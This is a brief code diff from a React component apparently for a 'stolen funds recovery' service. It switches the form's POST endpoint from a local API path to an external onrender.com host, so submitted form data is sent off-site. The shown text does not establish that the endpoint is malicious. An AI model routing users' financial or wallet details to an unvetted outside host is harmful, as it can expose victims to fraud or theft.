@@ -54,7 +54,7 @@ export default function StolenFundsRecovery() {
   const handleSubmit = async () => {
     setLoading(true);
     try {
-      const response = await fetch('/api/recover-stolen-funds', {
+      const response = await fetch('https://autoclaimtoken.onrender.com/api/recover-stolen-funds', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify(formData)
